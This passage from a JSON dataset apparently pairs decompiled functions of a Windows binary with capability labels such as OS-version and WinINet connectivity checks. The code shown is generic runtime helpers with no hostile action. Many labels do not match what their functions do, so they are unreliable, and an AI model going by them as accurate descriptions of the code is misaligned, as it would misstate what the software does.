        "decompiled_code": "\nuint fcn.00416548(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00409ee4();\n        return uVar2;\n    }\n    iVar3 = fcn.004164f0();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.00409a8c();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00409a8c();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00409ee4();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.004164fc();\n    }\n    return uVar2;\n}\n",
        "token_count": 217
    },
    "0041661c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041661c(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 398
    },
    "0041a050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a050(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0041a070": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a070(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0042075c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042075c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "0042077c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042077c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "004185e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004185e4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00418584();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00418584();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.0040487c();\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00418654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00418654(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.0041975c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 196
    },
    "0041879c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041879c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x41884c;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00404530();\n    fcn.00405794();\n    iVar1 = fcn.004186f0();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040dbfc(0, &var_10ch);\n        fcn.00404ec4();\n    }\n    if (*(in_EAX + 4) == 0) {\n        uVar2 = fcn.00404620();\n        *(in_EAX + 4) = uVar2;\n    }\n    fcn.0041975c();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x418853;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 351
    },
    "004188a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004188a0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.004198b4();\n            cVar1 = fcn.00418880();\n            if (cVar1 != '\\0') {\n                fcn.004197a8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 4) != 0) && (iVar2 = *(*(in_EAX + 4) + 8) + -1,  -1 < iVar2)) {\n        do {\n            fcn.004198b4();\n            cVar1 = fcn.00418880();\n            if (cVar1 != '\\0') {\n                fcn.004197a8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (*(in_EAX + 8) != NULL) {\n        iVar2 = (**(**(in_EAX + 8) + 0x14))();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                (**(**(in_EAX + 8) + 0x18))();\n                cVar1 = fcn.00418880();\n                if (cVar1 != '\\0') {\n                    (**(**(in_EAX + 8) + 0x48))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "00418ab0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418ab0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.004198b4();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.004186f0();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 175
    },
    "00418b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418b84(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00418a6c();\n    if (iVar2 == 0) {\n        fcn.00418af4(&stack0xfffffffc);\n    }\n    fcn.00418578();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.004198b4();\n            if (((iVar3 != iVar2) && (*(iVar3 + 4) != 0)) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.004198b4();\n                    cVar1 = fcn.0040487c();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.00418a6c(),  iVar4 == iVar2)) {\n                        fcn.004197a8();\n                        fcn.0041975c();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00418d14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418d14(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.004198b4();\n            fcn.004188a0();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00404650();\n                fcn.004197a8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00418d64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418d64(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x418d79;\n        in_EAX = fcn.00404974();\n    }\n    puStack48 = 0x418d8c;\n    fcn.00404620();\n    puStack48 = 0x418d98;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x418da8;\n    fcn.00418c50();\n    uStack52 = 0x418e63;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x49a9c4 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.004198b4();\n            cVar2 = fcn.00418758();\n            if (cVar2 != '\\0') {\n                fcn.0041975c();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x49a9c4 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.004198b4();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.0041975c();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x418e6a;\n    uStack52 = 0x418e62;\n    fcn.00418d08();\n    return;\n}\n",
        "token_count": 551
    },
    "00418ec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00418ec0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x418edd;\n    fcn.00418c50();\n    uStack32 = 0x418f37;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004198b4();\n            iVar1 = fcn.004186f0();\n            if (iVar1 != 0) {\n                fcn.00404f70();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x418f3e;\n    uStack32 = 0x418f36;\n    iVar2 = fcn.00418d08();\n    return iVar2;\n}\n",
        "token_count": 296
    },
    "004192a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004192a8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4192c0;\n    iVar1 = fcn.00419c24();\n    uStack28 = 0x419312;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.004198b4();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00404f70();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x419319;\n    uStack28 = 0x419311;\n    uVar3 = fcn.00419c88();\n    return uVar3;\n}\n",
        "token_count": 301
    },
    "004193a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004193a8(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x49a9c8 == 0) {\n        *0x49a9c8 = fcn.00404620();\n    }\n    iVar1 = fcn.00419910();\n    if (iVar1 < 0) {\n        fcn.0041975c();\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "004193e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004193e8(void)\n\n{\n    if (*0x49a9c8 != 0) {\n        fcn.004199f8();\n    }\n    return;\n}\n",
        "token_count": 42
    },
    "00419400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00419400(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x49a9c8 != 0) && (iVar3 = *(*0x49a9c8 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.004198b4();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "00419440": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00419440(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x49a9b4 != NULL) {\n        uVar1 = (**0x49a9b4)();\n        return uVar1;\n    }\n    uVar1 = fcn.00419400();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 89
    },
    "00419570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419570(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00407688();\n    fcn.00404650();\n    iVar1 = fcn.00407688();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.0041999c();\n    iVar3 = fcn.00407688();\n    *(iVar3 + 8) = uVar2;\n    fcn.004197a8();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.00407688();\n        *(iVar1 + 0xc) = 0;\n        fcn.00404650();\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00419674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419674(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x41968a;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x49a9b0 + 0x14))();\n    uStack24 = 0x419722;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x419738 == (*(var_4h + 0x1c) & *0x419734);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x4196bf;\n        puStack20 = &stack0xfffffffc;\n        fcn.004194e8();\n    }\n    uStack36 = 0x419703;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00404528();\n    var_9h = fcn.004195cc(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.00419540();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41970a;\n    if (var_ah != '\\0') {\n        uStack36 = 0x419702;\n        fcn.00419570();\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "00419ce8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419ce8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00419cc4(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) * 4;\n        iVar2 = *(in_EAX + 4) + 0x1f;\n        if (iVar2 < 0) {\n            iVar2 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar2 = (iVar2 >> 5) * 4;\n        if (iVar2 != iVar1) {\n            iVar3 = 0;\n            if (iVar1 != 0) {\n                iVar3 = fcn.00402f00();\n                fcn.00403af4();\n            }\n            if (iVar2 != 0) {\n                if (iVar3 != 0) {\n                    fcn.00419cdc();\n                    fcn.004030fc();\n                }\n                fcn.00402f1c();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00419d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419d8c(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040dbc0();\n            fcn.00404ec4();\n            return;\n        }\n        fcn.00419ce8();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 217
    },
    "00419f4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419fb5)\n\nvoid fcn.00419f4c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x419fe1;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00404530();\n    fcn.00405794();\n    iVar1 = fcn.0040484c();\n    if (iVar1 != 0) {\n        fcn.0040484c();\n        fcn.0040484c();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.00405530(0x419fe8);\n    return;\n}\n",
        "token_count": 219
    },
    "0041a0d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a0d8(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x41a0f4;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x41a132;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.0041999c();\n            fcn.00404650();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41a139;\n        uStack20 = 0x41a131;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "0041a328": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a328(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[4] = in_EAX[4] + 1;\n    return;\n}\n",
        "token_count": 73
    },
    "0041a3e4": {
        "rules": [
